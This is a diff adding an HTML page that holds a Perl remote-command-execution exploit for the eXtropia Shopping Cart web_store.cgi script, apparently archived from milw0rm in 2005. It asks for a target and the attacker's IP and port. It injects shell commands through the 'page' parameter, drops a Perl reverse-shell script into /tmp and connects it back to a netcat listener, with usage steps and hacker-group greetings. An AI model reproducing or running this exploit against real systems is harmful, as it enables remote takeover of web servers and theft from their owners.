@@ -1,0 +1,81 @@
+<html>
+<head>
+<title>eXtropia Shopping Cart web_store.cgi Remote Exploit</title>
+<pre>
+#!/usr/bin/perl -w
+#
+#********************************************************************************************
+#               Remote Command Execution Vulnerability In Web_store.cgi                     *
+#                                                                                           *
+#                              [SegmentationFault Group]                                    *
+#                                                                                           *
+#                                                                                           *
+#             Greetz to  :  Xsupr3mo -  failed   - Status-x -  Stealh - P3S4D3L0            *
+#             Greetz to  :  berhooz  -   nima  - ehsan   - Unknown  OutLaw  eutanasia       *
+#                                      www.ashiyane.com                                     *
+#                                                                                           *
+#********************************************************************************************
+#ok setp by setp to work :                      *                                           *
+#[*] start exploit                              *   If connect back shell not found: maybe :*
+#[*] run in your system: nc -l -vv -p 2975      *   you do not have perm to write in /tmp   *
+#[*] starting connect back on 127.0.0.1 :2975   *            Shell not vulnerable           *
+#[*] DONE!                                      *   test and put in /$path/hints.pl?|cd /tmp*
+#[*] Look netcat windows                        *     other path that u know dont have perm *
+#                                               *                                           *
+#********************************************************************************************
+#############################################################################################
+use IO::Socket;
+
+print &quot;*****************************************************************\n&quot;;
+print &quot;\tRemote Command Execution Vulnerability in web_store.cgi\n  &quot;;
+print &quot;\t\t-=[  SegmentationFault Group  ]=-\n&quot;;      
+print &quot;\t\tcode writen    by sun-os [ActionSpider]\n\n&quot;;  
+print &quot;\tGerttz to : Xsupr3mo -  failed   - Status-x -  Stealh&quot;;
+print &quot;\n\tand : Behrooz - nima - ehsan www.ashiyane.com\n&quot;;
+print &quot;*****************************************************************\n\n&quot;;
+
+
+print &quot;enter hostname or ip : \n&quot;;
+chomp($server=&lt;STDIN&gt;);
+
+print &quot;port: (default: 80)\n&quot;;
+chomp($port=&lt;STDIN&gt;);
+$port=80 if ($port =~/\D/ );
+$port=80 if ($port eq &quot;&quot; );
+
+print &quot;path: (???/web_store.cgi?)\n&quot;;
+chomp($path=&lt;STDIN&gt;);
+
+print &quot;your ip (for reverse connect): \n&quot;;
+chomp($ip=&lt;STDIN&gt;);
+
+print &quot;your port (for reverse connect): \n&quot;;
+chomp($reverse=&lt;STDIN&gt;);
+
+print &quot;ok Remote Command Execution now Start&quot;;
+print &quot;|+| try to exploiting...\n&quot;;
+
+$string=&quot;/$path/web_store.cgi?page=.html|cd /tmp;echo &quot;.q{use Socket;$execute= 'echo &quot;`uname -a`&quot;;echo &quot;`id`&quot;;/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die(&quot;Error: $!\n&quot;);$paddr=sockaddr_in($port, $iaddr) || die(&quot;Error: $!\n&quot;);$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);connect(SOCKET, $paddr) || die(&quot;Error: $!\n&quot;);open(STDIN, &quot;&gt;&amp;SOCKET&quot;);open(STDOUT, &quot;&gt;&amp;SOCKET&quot;);open(STDERR, &quot;&gt;&amp;SOCKET&quot;);system($execute);close(STDIN)}.&quot; &gt;&gt;dc.pl;perl dc.pl $ip $reverse|&quot;;
+
+print &quot;|+| OK! \n&quot;;
+print &quot;|+| NOW, run in your system: nc -l -vv -p $reverse\n&quot;;
+print &quot;|+| starting connect back on $ip :$reverse\n&quot;;
+print &quot;|+| DONE!\n&quot;;
+print &quot;|+| Look netcat windows\n\n&quot;;
+$socket=IO::Socket::INET-&gt;new( PeerAddr =&gt; $server, PeerPort =&gt; $port, Proto =&gt; tcp)
+or die;
+
+print $socket &quot;POST $path HTTP/1.1\n&quot;;
+print $socket &quot;Host: $server\n&quot;;
+print $socket &quot;Accept: */*\n&quot;;
+print $socket &quot;User-Agent: blackbox\n&quot;;
+print $socket &quot;Pragma: no-cache\n&quot;;
+print $socket &quot;Cache-Control: no-cache\n&quot;;
+print $socket &quot;Connection: close\n\n&quot;;
+
+print &quot;have nice shell...&quot;;
+
+# milw0rm.com [2005-06-15]
+</pre>
+</html>
+
